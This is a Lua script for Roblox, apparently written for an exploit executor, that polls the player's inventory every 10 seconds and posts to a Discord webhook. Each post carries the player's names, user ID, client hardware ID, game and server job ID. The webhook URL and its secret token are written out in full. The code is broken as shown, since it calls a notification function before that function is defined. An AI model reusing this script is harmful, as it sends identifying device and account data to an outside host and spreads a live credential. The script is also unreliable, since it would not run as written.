HttpService = game:GetService("HttpService")
local Webhook_URL = "https://discord.com/api/webhooks/1214555116015718400/T0_T_4Ted8lZYkeFTUhG7G6Lb3Z5SYINe_iXCzFN4E7QpzkFfTuADOPsoSxKwX074JcG"
local jobid = game.JobId
local Userid = game.Players.LocalPlayer.UserId
local DName = game.Players.LocalPlayer.DisplayName
local Name = game.Players.LocalPlayer.Name
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local requestfunc = http and http.request or http_request or fluxus and fluxus.request or request

-- Function to check for new frames or tools
local function checkForNewItems()
    local inventoryFrames = {
        game.Players.LocalPlayer.PlayerGui.MainUI.Interface.Inventory.WeaponFrame,
        game.Players.LocalPlayer.PlayerGui.MainUI.Interface.Inventory.ItemsFrame
    }
    
    for _, frame in pairs(inventoryFrames) do
        for _, item in pairs(frame:GetChildren()) do
            if item:IsA("Frame") or item:IsA("Tool") then
                -- Notify about the new item
                sendNotification("New item detected", item.Name)
            end
        end
    end
    
    -- Check the backpack for new tools
    for _, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            -- Notify about the new tool
            sendNotification("New tool in backpack", tool.Name)
        end
    end
end

-- Function to send a notification through the webhook
local function sendNotification(title, content)
    local req = requestfunc({
        Url = Webhook_URL,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = HttpService:JSONEncode({
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = "Display Name: " .. DName .. " \nUsername: " .. Name .. " \nUser Id: " .. Userid .. "\nHwid: " .. hwid .. "\nGame: " .. GameName .. "\nJob Id: " .. jobid .. "\n" .. content
            }}
        })
    })
end

-- Check for new items periodically (you can adjust the interval as needed)
while wait(10) do
    checkForNewItems()
end

